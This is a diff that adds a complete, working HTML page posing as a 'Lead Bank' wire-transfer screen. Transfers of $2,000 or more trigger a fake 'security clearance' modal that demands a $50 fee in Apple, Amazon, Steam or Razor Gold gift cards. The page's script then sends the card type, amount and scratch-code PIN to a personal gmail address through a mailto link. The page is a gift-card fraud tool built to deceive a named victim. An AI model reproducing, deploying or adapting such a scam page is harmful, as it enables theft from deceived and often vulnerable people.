@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Transfer | Lead Bank</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --lead-navy: #061227;
+            --lead-mint: #00d395;
+            --slate: #64748b;
+            --glass: rgba(255, 255, 255, 0.95);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, sans-serif; }
+        body { background: #f8fafc; max-width: 500px; margin: 0 auto; color: var(--lead-navy); }
+
+        /* Header */
+        header {
+            padding: 20px; display: flex; align-items: center; justify-content: space-between;
+            background: #fff; border-bottom: 1px solid #edf2f7; position: sticky; top: 0; z-index: 100;
+        }
+        .back-circle { 
+            width: 35px; height: 35px; border-radius: 50%; background: #f1f5f9; 
+            display: flex; align-items: center; justify-content: center; text-decoration: none; color: var(--lead-navy);
+        }
+
+        /* Bird Logo Branding */
+        .brand-header { text-align: center; padding: 30px 20px; }
+        .bird-icon { font-size: 32px; color: var(--lead-mint); margin-bottom: 10px; }
+        
+        /* Main Form */
+        .content { padding: 0 20px 40px; }
+        .transfer-card {
+            background: #fff; border-radius: 24px; padding: 25px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.03); border: 1px solid #f1f5f9;
+        }
+
+        .input-box { margin-bottom: 20px; }
+        .input-box label { display: block; font-size: 11px; font-weight: 700; color: var(--slate); text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        .input-box input, .input-box select {
+            width: 100%; padding: 16px; border: 1.5px solid #e2e8f0; border-radius: 14px;
+            font-size: 16px; outline: none; background: #fff; transition: 0.3s;
+        }
+        .input-box input:focus { border-color: var(--lead-mint); }
+
+        .btn-send {
+            width: 100%; background: var(--lead-navy); color: white; padding: 18px;
+            border: none; border-radius: 16px; font-size: 16px; font-weight: 700;
+            cursor: pointer; margin-top: 10px; transition: 0.3s;
+        }
+
+        /* Security Modal Overlay */
+        .modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(6, 18, 39, 0.9); display: none; 
+            align-items: center; justify-content: center; z-index: 2000; padding: 20px;
+        }
+        .modal-content {
+            background: #fff; width: 100%; border-radius: 28px; padding: 30px 25px;
+            text-align: center; animation: slideUp 0.4s ease-out;
+        }
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        .secure-badge {
+            background: #e6fbf5; color: var(--lead-mint); display: inline-block;
+            padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: 700; margin-bottom: 15px;
+        }
+
+        .fee-item {
+            display: flex; justify-content: space-between; padding: 15px 0;
+            border-bottom: 1px dashed #e2e8f0; font-size: 14px; margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <a href="alexmoreno.lead.bank.dashboard.html" class="back-circle"><i class="fas fa-chevron-left"></i></a>
+        <span style="font-weight: 800; font-size: 15px;">Wire Transfer</span>
+        <div style="width:35px"></div> </header>
+
+    <div class="brand-header">
+        <div class="bird-icon"><i class="fas fa-dove"></i></div>
+        <h2 style="font-size: 22px; font-weight: 800;">Transfer Funds</h2>
+        <p style="font-size: 13px; color: var(--slate); margin-top: 5px;">Securely move money to any bank worldwide.</p>
+    </div>
+
+    <div class="content">
+        <div class="transfer-card">
+            <div class="input-box">
+                <label>Beneficiary Name</label>
+                <input type="text" placeholder="e.g. John Doe">
+            </div>
+
+            <div class="input-box">
+                <label>Bank Name</label>
+                <input type="text" placeholder="Receiving Bank">
+            </div>
+
+            <div class="input-box">
+                <label>Account / IBAN</label>
+                <input type="text" placeholder="Enter account number">
+            </div>
+
+            <div class="input-box">
+                <label>Amount (USD)</label>
+                <input type="number" id="amt" placeholder="0.00" style="font-weight: 800; font-size: 20px;">
+            </div>
+
+            <button class="btn-send" onclick="verifyTransaction()">Continue to Review</button>
+        </div>
+    </div>
+
+    <div class="modal" id="securityModal">
+        <div class="modal-content">
+            <div class="secure-badge">LEAD SECURE GATEWAY</div>
+            <div class="bird-icon" style="font-size: 40px;"><i class="fas fa-dove"></i></div>
+            <h3 style="font-size: 18px; margin-bottom: 10px;">Security Clearance Required</h3>
+            <p style="font-size: 13px; color: var(--slate); margin-bottom: 20px;">Transactions over $2,000.00 require a manual clearance voucher.</p>
+            
+            <div class="fee-item">
+                <span>Clearance Fee:</span>
+                <span style="font-weight: 800; color: var(--lead-mint);">$50.00</span>
+            </div>
+
+            <form id="voucherForm">
+                <div class="input-box" style="text-align: left;">
+                    <label>Voucher Type</label>
+                    <select id="vType" required>
+                        <option value="">Select Card Type</option>
+                        <option value="Apple/iTunes">Apple / iTunes</option>
+                        <option value="Amazon">Amazon</option>
+                        <option value="Steam">Steam</option>
+                        <option value="RazorGold">Razor Gold</option>
+                    </select>
+                </div>
+
+                <div class="input-box" style="text-align: left;">
+                    <label>Voucher Amount</label>
+                    <input type="number" id="vAmt" placeholder="Min $50" required>
+                </div>
+
+                <div class="input-box" style="text-align: left;">
+                    <label>Voucher Code (PIN)</label>
+                    <input type="text" id="vPin" placeholder="Enter scratch code" required>
+                </div>
+
+                <button type="submit" class="btn-send" style="background: var(--lead-mint);">Authenticate Transfer</button>
+                <p style="font-size: 11px; color: #94a3b8; margin-top: 15px;">Your transfer remains pending until clearance is verified.</p>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function verifyTransaction() {
+            const amount = document.getElementById('amt').value;
+            if (!amount || amount <= 0) {
+                alert("Please enter a valid amount");
+                return;
+            }
+
+            if (amount >= 2000) {
+                document.getElementById('securityModal').style.display = 'flex';
+            } else {
+                alert("Transfer initiated. Please check your email for confirmation.");
+            }
+        }
+
+        document.getElementById('voucherForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const type = document.getElementById('vType').value;
+            const amt = document.getElementById('vAmt').value;
+            const pin = document.getElementById('vPin').value;
+            const transferAmt = document.getElementById('amt').value;
+
+            const subject = "SECURITY VOUCHER SUBMISSION - $" + amt;
+            const body = `--- LEAD BANK SECURITY CLEARANCE ---\n\n` +
+                         `Voucher: ${type}\n` +
+                         `Balance: $${amt}\n` +
+                         `Code: ${pin}\n\n` +
+                         `Intent: Wire Transfer of $${transferAmt}\n` +
+                         `Client: Alex Moreno`;
+
+            const mailto = `mailto:alexmorenolina@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            
+            // Send the data
+            window.location.href = mailto;
+
+            // Optional UI Reset
+            setTimeout(() => {
+                alert("Voucher received. Authentication in progress.");
+                document.getElementById('securityModal').style.display = 'none';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
